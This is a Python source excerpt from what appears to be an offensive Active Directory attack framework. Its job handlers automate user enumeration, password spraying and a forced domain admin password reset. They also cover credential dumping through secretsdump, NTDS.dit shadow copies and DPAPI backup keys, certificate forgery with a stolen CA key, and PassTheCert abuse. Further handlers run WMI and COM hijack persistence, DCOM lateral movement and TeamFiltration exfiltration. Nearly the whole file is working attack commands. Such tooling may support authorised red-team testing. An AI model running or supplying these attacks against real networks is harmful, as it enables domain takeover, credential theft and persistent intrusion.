        await emit({"stream": "stdout", "line": "[*] Enumerating valid domain usernames (Kerberos pre-auth timing)", "ts": _ts()})
        for tool in ["kerbrute"]:
            if shutil.which(tool):
                # Use common wordlist
                wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
                if not os.path.exists(wordlist):
                    wordlist = "/usr/share/wordlists/dirb/common.txt"
                cmd = [tool, "userenum", "--dc", dc_ip, "-d", domain, wordlist]
                rc = await self._stream_subprocess(cmd, emit)
                return rc
        # Fallback: samrdump (no-auth user enum)
        await emit({"stream": "stdout", "line": "[*] kerbrute not found — using samrdump (null session) for user enumeration", "ts": _ts()})
        cmd = ["impacket-samrdump", f"{dc_ip}"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_password_spray(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        dc_ip = params.get("dc_ip", target)
        password = params.get("password", "Password1")
        userlist = params.get("userlist", "/tmp/users.txt")
        await emit({"stream": "stdout", "line": f"[*] Password spray: '{password}' against {domain} users", "ts": _ts()})
        await emit({"stream": "stdout", "line": "[!] Low-and-slow: 1 password per user. Watch for lockouts (threshold typically 5-10).", "ts": _ts()})
        for tool in ["kerbrute"]:
            if shutil.which(tool):
                cmd = [tool, "passwordspray", "--dc", dc_ip, "-d", domain, userlist, password]
                rc = await self._stream_subprocess(cmd, emit)
                if rc == 0:
                    await emit({"stream": "loot", "loot_type": "cleartext_creds", "data": f"domain_user:{password}", "ts": _ts()})
                return rc
        # Fallback: crackmapexec SMB spray
        if shutil.which("crackmapexec") or shutil.which("cme"):
            tool = "crackmapexec" if shutil.which("crackmapexec") else "cme"
            cmd = [tool, "smb", dc_ip, "-u", userlist, "-p", password, "--no-bruteforce", "--continue-on-success"]
            return await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stderr", "line": "[!] No spray tool found. Install kerbrute or crackmapexec.", "ts": _ts()})
        return 1

    # ── Manual Steps ─────────────────────────────────────────────────────────

    async def _run_password_reset(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        target_user = params.get("target_user", "<DA_USER>")
        new_pass = params.get("new_pass", "Hack3d!2024")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        return await self._manual_step(params, emit, "Force DA Password Reset (GenericAll)", [
            f"[*] Target: {domain}\\{target_user}",
            "[*] Using net rpc:",
            f"    net rpc password {target_user} {new_pass} -U {domain}/{username}%{password} -S {dc_ip}",
            "[*] Or impacket changepasswd:",
            f"    impacket-changepasswd {domain}/{username}:{password}@{dc_ip} -newpass {new_pass} -target-user {target_user}",
            f"[!] After reset, the DA account creds are: {target_user}:{new_pass}",
        ])

    # ── SCCM ─────────────────────────────────────────────────────────────────

    async def _run_sccm_enum(self, job_id: str, params: dict, emit) -> int:
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", params.get("target", ""))
        await emit({"stream": "stdout", "line": "[*] Enumerating SCCM/ConfigMgr hierarchy via LDAP and DNS", "ts": _ts()})
        # Try sccmhunter
        for tool in ["sccmhunter", "sccmhunter.py"]:
            if shutil.which(tool):
                cmd_args = ["-u", username, "-p", password or "", "-d", domain, "-dc-ip", dc_ip]
                cmd = [tool, "find", *cmd_args]
                return await self._stream_subprocess(cmd, emit)
        # Fallback: LDAP search for SCCM management points
        await emit({"stream": "stdout", "line": "[*] sccmhunter not found — LDAP search for SCCM SCP", "ts": _ts()})
        if hashes:
            nt = hashes.split(":")[-1] if ":" in hashes else hashes
            auth = ["-H", f":{nt}"]
        else:
            auth = ["-w", password]
        if shutil.which("ldapsearch"):
            cmd = [
                "ldapsearch", "-x", "-H", f"ldap://{dc_ip}",
                "-D", f"{username}@{domain}", *auth,
                "-b", f"DC={domain.replace('.', ',DC=')}",
                "(objectClass=mSSMSManagementPoint)", "dNSHostName", "mSSMSDefaultMP",
            ]
            return await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stderr", "line": "[!] No SCCM enumeration tool found.", "ts": _ts()})
        return 1

    async def _run_sccm_naa(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        mp_host = params.get("mp_host", target)  # management point host
        await emit({"stream": "stdout", "line": f"[*] Extracting SCCM NAA credentials from {mp_host}", "ts": _ts()})
        for tool in ["sccmhunter", "sccmhunter.py"]:
            if shutil.which(tool):
                cmd = [tool, "smb", "-u", username, "-p", password or "", "-d", domain, "-dc-ip", mp_host, "naa"]
                return await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[!] sccmhunter not found — manual NAA extraction:", "ts": _ts()})
        return await self._manual_step(params, emit, "SCCM NAA Extraction", [
            f"[*] Management Point: {mp_host}",
            "[*] Option 1 — SharpSCCM (Windows):",
            f"    SharpSCCM.exe get naa -mp {mp_host} -sc <SITE_CODE>",
            "[*] Option 2 — sccmhunter (Linux):",
            f"    pip install sccmhunter && sccmhunter smb -u {username} -p {password} -d {domain} -dc-ip {mp_host} naa",
            "[*] NAA credentials are often highly privileged domain accounts.",
        ])

    async def _run_kerberoast_spn_enum(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        dc_ip = params.get("dc_ip", target)
        auth = ["-hashes", hashes] if hashes else []
        creds = f"{domain}/{username}:{password}" if not hashes else f"{domain}/{username}"
        await emit({"stream": "stdout", "line": "[*] Enumerating Kerberoastable service accounts (SPN list, no ticket request)", "ts": _ts()})
        cmd = [
            "impacket-GetUserSPNs",
            creds, *auth,
            "-dc-ip", dc_ip,
        ]
        rc = await self._stream_subprocess(cmd, emit)
        await emit({"stream": "stdout", "line": "[*] Hint: look for sql_svc, svc_*, MSSQLSvc/ SPNs — prime Kerberoast targets", "ts": _ts()})
        return rc

    # ── Credential Dump ───────────────────────────────────────────────────────

    async def _run_cred_dump_lsass(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        await emit({"stream": "stdout", "line": "[*] LSASS credential dump — remote secretsdump fallback", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        cmd = ["impacket-secretsdump", *auth, creds, "-target-ip", target, "-just-dc-user", "krbtgt"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_cred_dump_ntds_vss(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        await emit({"stream": "stdout", "line": "[*] NTDS dump via VSS (ntdsutil snapshot method)", "ts": _ts()})
        return await self._manual_step(params, emit, "NTDS.dit via Volume Shadow Copy", [
            f"[*] Target DC: {target}",
            "[*] Step 1 — Create shadow copy:",
            "    vssadmin create shadow /for=C:",
            "[*] Step 2 — Copy NTDS.dit + SYSTEM hive from shadow:",
            "    copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\Temp\\ntds.dit",
            "    copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM",
            "[*] Step 3 — Parse offline from Linux:",
            "    impacket-secretsdump -ntds C:\\Temp\\ntds.dit -system C:\\Temp\\SYSTEM -outputfile hashes LOCAL",
        ])

    async def _run_cred_dump_secretsdump(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        await emit({"stream": "stdout", "line": "[*] Full secretsdump: SAM + LSA + NTDS", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        cmd = ["impacket-secretsdump", *auth, f"{creds}@{target}"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_dpapi_backup_key(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        await emit({"stream": "stdout", "line": "[*] Retrieving DPAPI domain backup key from DC", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        for tool in ["impacket-dpapi"]:
            if shutil.which(tool):
                cmd = [tool, "backupkeys", "-t", f"{creds}@{target}", *auth, "--export"]
                return await self._stream_subprocess(cmd, emit)
        return await self._manual_step(params, emit, "DPAPI Backup Key Extraction", [
            f"[*] Target DC: {target}",
            "[*] With impacket-dpapi:",
            f"    impacket-dpapi backupkeys -t {domain}/{username}:{password}@{target} --export",
            "[*] With mimikatz (from DA session on DC):",
            f"    mimikatz.exe \"lsadump::backupkeys /system:{target} /export\" exit",
            "[*] Use exported key with SharpDPAPI: SharpDPAPI.exe triage /pvk:<key.pvk>",
        ])

    async def _run_dpapi_sharpdpapi(self, job_id: str, params: dict, emit) -> int:
        await emit({"stream": "stdout", "line": "[*] SharpDPAPI — Windows-side execution required", "ts": _ts()})
        return await self._manual_step({}, emit, "SharpDPAPI Full Sweep", [
            "[*] Run on compromised Windows host with DA/SYSTEM context:",
            "    SharpDPAPI.exe triage                     # current user",
            "    SharpDPAPI.exe triage /unprotect          # all users (admin)",
            "    SharpDPAPI.exe certificates /machine      # machine certs",
            "    SharpDPAPI.exe logins                     # browser passwords",
            "    SharpDPAPI.exe vaults                     # credential manager",
        ])

    # ── PKI / Certificate Attacks ─────────────────────────────────────────────

    async def _run_certipy_ca_backup(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        ca_name = params.get("ca_name", "")
        await emit({"stream": "stdout", "line": f"[*] Backing up CA certificate and private key from {target}", "ts": _ts()})
        if hashes:
            auth = ["-hashes", hashes, "-u", f"{username}@{domain}"]
        else:
            auth = ["-u", f"{username}@{domain}", "-p", password]
        cmd = ["certipy", "ca", "-backup", "-ca", ca_name, "-target", target, *auth]
        return await self._stream_subprocess(cmd, emit)

    async def _run_certipy_forge(self, job_id: str, params: dict, emit) -> int:
        ca_pfx = params.get("ca_pfx", "")
        target_upn = params.get("target_upn", "")
        await emit({"stream": "stdout", "line": f"[*] Forging certificate for {target_upn} using stolen CA key", "ts": _ts()})
        cmd = ["certipy", "forge", "-ca-pfx", ca_pfx, "-upn", target_upn, "-subject", f"CN={target_upn.split('@')[0]}", "-out", f"forged_{target_upn.split('@')[0]}.pfx"]
        return await self._stream_subprocess(cmd, emit)

    async def _run_certipy_unpac(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        pfx = params.get("pfx", "")
        await emit({"stream": "stdout", "line": "[*] UnPAC the Hash — PKINIT → NT hash extraction", "ts": _ts()})
        cmd = ["certipy", "auth", "-pfx", pfx, "-dc-ip", target, "-domain", domain, "-username", username]
        return await self._stream_subprocess(cmd, emit)

    async def _run_passthe_cert(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        cert_pem = params.get("cert_pem", "")
        key_pem = params.get("key_pem", "")
        action = params.get("action", "ldap-shell")
        await emit({"stream": "stdout", "line": f"[*] PassTheCert via SChannel → LDAP ({action})", "ts": _ts()})
        return await self._manual_step(params, emit, "PassTheCert via Certificate", [
            f"[*] Domain: {domain}  DC: {target}",
            f"[*] Action: {action}",
            "[*] LDAP shell:",
            f"    python3 passthecert.py -action ldap-shell -crt {cert_pem} -key {key_pem} -domain {domain} -dc-host {target}",
            "[*] Add RBCD:",
            f"    python3 passthecert.py -action rbcd -crt {cert_pem} -key {key_pem} -domain {domain} -dc-host {target} -delegate-to 'TARGET$' -delegate-from 'ATTACKER$'",
            "[*] Shadow credentials:",
            f"    python3 passthecert.py -action write_shadowcred -crt {cert_pem} -key {key_pem} -domain {domain} -dc-host {target} -target 'targetuser'",
        ])

    # ── WMI / COM Persistence ─────────────────────────────────────────────────

    async def _run_wmi_subscription(self, job_id: str, params: dict, emit) -> int:
        payload = params.get("payload", "cmd.exe /c whoami > C:\\Temp\\wmi.txt")
        filter_name = params.get("filter_name", "UpdateCheck")
        consumer_name = params.get("consumer_name", "UpdateConsumer")
        await emit({"stream": "stdout", "line": "[*] WMI Permanent Subscription persistence (Windows-side execution)", "ts": _ts()})
        return await self._manual_step(params, emit, "WMI Event Subscription Persistence", [
            f"[*] Filter: {filter_name}  Consumer: {consumer_name}",
            f"[*] Payload: {payload}",
            "[*] Step 1 — Create event filter (system uptime >= 300s):",
            f"    $f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{filter_name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300\"}}",
            "[*] Step 2 — Create consumer:",
            f"    $c = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{consumer_name}';CommandLineTemplate='{payload}'}}",
            "[*] Step 3 — Bind filter to consumer:",
            "    Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}",
            "[*] Verify: Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select Name,Query",
        ])

    async def _run_com_hijack(self, job_id: str, params: dict, emit) -> int:
        clsid = params.get("clsid", "{B54F3741-5B07-11CF-A4B0-00AA004A55E8}")
        dll_path = params.get("dll_path", "C:\\Users\\user\\AppData\\Local\\Temp\\evil.dll")
        await emit({"stream": "stdout", "line": "[*] COM CLSID Hijack via HKCU (no admin required)", "ts": _ts()})
        return await self._manual_step(params, emit, "COM CLSID Hijack Persistence", [
            f"[*] CLSID: {clsid}",
            f"[*] Malicious DLL: {dll_path}",
            "[*] Register DLL under HKCU:",
            f"    reg add \"HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32\" /ve /t REG_SZ /d \"{dll_path}\" /f",
            f"    reg add \"HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32\" /v ThreadingModel /t REG_SZ /d Both /f",
            "[*] Find hijackable CLSIDs (Procmon filter: RegQueryValue + NAME NOT FOUND + CLSID):",
            "    Get-ChildItem HKLM:\\Software\\Classes\\CLSID | Where-Object {-not (Test-Path \"HKCU:\\Software\\Classes\\CLSID\\$($_.PSChildName)\")} | Select PSChildName | head -20",
            f"[*] Cleanup: reg delete \"HKCU\\Software\\Classes\\CLSID\\{clsid}\" /f",
        ])

    async def _run_dcom_exec(self, job_id: str, params: dict, emit) -> int:
        target = params.get("target", "")
        domain = params.get("domain", "")
        username = params.get("username", "")
        password = params.get("password", "")
        hashes = params.get("hashes", "")
        command = params.get("command", "ipconfig")
        await emit({"stream": "stdout", "line": f"[*] DCOM lateral movement to {target}", "ts": _ts()})
        if hashes:
            creds = f"{domain}/{username}"
            auth = ["-hashes", hashes]
        else:
            creds = f"{domain}/{username}:{password}"
            auth = []
        for obj in ["MMC20", "ShellWindows"]:
            cmd = ["impacket-dcomexec", *auth, f"{creds}@{target}", command, "-object", obj]
            if shutil.which("impacket-dcomexec"):
                return await self._stream_subprocess(cmd, emit)
        return await self._manual_step(params, emit, "DCOM Execution", [
            f"    impacket-dcomexec {domain}/{username}:{password}@{target} '{command}' -object MMC20",
        ])

    # ── Cloud Assessment (guidance-based) ─────────────────────────────────────

    async def _run_cloud_entra_enum(self, job_id: str, params: dict, emit) -> int:
        tenant = params.get("tenant", "")
        await emit({"stream": "stdout", "line": f"[*] Entra ID enumeration guidance for tenant: {tenant}", "ts": _ts()})
        return await self._manual_step(params, emit, "Entra ID Enumeration", [
            f"[*] Tenant: {tenant}",
            "[*] Install roadrecon: pip install roadrecon",
            "[*] Gather: roadrecon gather -u <user> -p <pass>",
            "[*] List users: az ad user list --all -o table",
            "[*] List apps: az ad app list --all -o table",
            "[*] List service principals: az ad sp list --all -o table",
            "[*] Graph enumeration: curl -H 'Authorization: Bearer <token>' https://graph.microsoft.com/v1.0/users",
        ])

    async def _run_cloud_adfs_enum(self, job_id: str, params: dict, emit) -> int:
        adfs_host = params.get("target", "")
        await emit({"stream": "stdout", "line": f"[*] ADFS enumeration for: {adfs_host}", "ts": _ts()})
        if shutil.which("curl"):
            cmd = ["curl", "-sk", f"https://{adfs_host}/FederationMetadata/2007-06/FederationMetadata.xml", "-o", "/dev/null", "-w", "%{http_code}"]
            rc = await self._stream_subprocess(cmd, emit)
            await emit({"stream": "stdout", "line": f"[*] Check: https://{adfs_host}/adfs/ls/ and /adfs/oauth2/authorize", "ts": _ts()})
            return rc
        return await self._manual_step({}, emit, "ADFS Enumeration", [
            f"    curl -sk https://{adfs_host}/FederationMetadata/2007-06/FederationMetadata.xml",
            f"    curl -sk https://{adfs_host}/adfs/ls/ -I",
        ])

    async def _run_cloud_m365_enum(self, job_id: str, params: dict, emit) -> int:
        tenant = params.get("tenant", "")
        await emit({"stream": "stdout", "line": f"[*] M365 / Graph API enumeration for tenant: {tenant}", "ts": _ts()})
        return await self._manual_step(params, emit, "M365 Enumeration via Graph", [
            f"[*] Tenant: {tenant}",
            "[*] Install: pip install roadrecon",
            "[*] Full gather: roadrecon gather -u <user> -p <pass> && roadrecon dump",
            "[*] TeamFiltration: teamfiltration --outpath ./out --exfiltrate --teams",
            "[*] List users: curl -H 'Authorization: Bearer <token>' https://graph.microsoft.com/v1.0/users",
            "[*] List groups: curl -H 'Authorization: Bearer <token>' https://graph.microsoft.com/v1.0/groups",
        ])
